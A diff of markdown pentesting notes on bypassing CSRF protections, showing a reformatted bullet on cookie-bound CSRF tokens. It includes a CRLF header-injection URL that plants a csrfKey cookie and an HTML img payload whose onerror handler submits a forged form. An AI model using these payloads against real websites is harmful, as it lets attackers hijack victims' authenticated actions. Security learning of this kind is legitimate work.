@@ -86,14 +86,16 @@ Some applications make use of the HTTP Referer header to attempt to defend again
   * Simply invent a token in the required format
 * Some apps don't validate if the token belongs to the same session as the requesting user.
   * Log in to the application with your account, obtain a valid token, and then feed that token to the victim user in their CSRF attack
-* Some apps do tie the CSRF token to a cookie, but not to the session cookie. So there are two token: one in a cookie and one in hidden input. (this can also have the same value)
-  * Can you set a cookie? Ex. Header injection with `CRLF`.&#x20;
-  * ```
-    /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
-    ```
-  * Log in to the application with your account -> obtain a valid token and associated cookie.
-  * Remove the auto-submit `<script>` block, and add the following code to inject the cookie.
-  * ```html
+*   Some apps do tie the CSRF token to a cookie, but not to the session cookie. So there are two token: one in a cookie and one in hidden input. (this can also have the same value)
+
+    * Can you set a cookie? Ex. Header injection with `CRLF`.(`%0d%0a`)
+    * ```
+      /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
+      ```
+    * Log in to the application with your account -> obtain a valid token and associated cookie.
+    * Generate CSRF PoC and remove the auto-submit `<script>` block. Then add the following code to inject the cookie.
+
+    ```html
     <img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
     ```
 
